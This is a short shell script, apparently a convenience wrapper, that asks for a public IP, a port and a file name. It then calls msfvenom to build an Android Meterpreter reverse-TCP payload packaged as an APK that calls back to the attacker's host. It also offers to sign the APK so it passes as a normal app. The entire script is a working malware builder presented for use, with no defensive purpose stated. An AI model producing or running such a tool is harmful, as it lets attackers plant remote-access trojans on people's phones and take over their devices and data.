#!/bin/sh
echo '###################################'
echo '###################################'
echo '##### Easy Android APK Maker ######'
echo '###################################'
echo '###################################'
echo 'Enter your public IP address'
read Public_IP
echo 'Enter the port you want to listen'
read LPort
echo 'Enter APK name without .apk'
read APKName
msfvenom -p android/meterpreter/reverse_tcp lhost=$Public_IP lport=$LPort R>$APKName'.apk'
echo 'Do you want to sign your apk? y/n'
read APKSign
if [ $APKSign = 'y' ]; then
d2j-apk-sign $APKName.apk
fi
echo 'OK Done. Pick it up!'
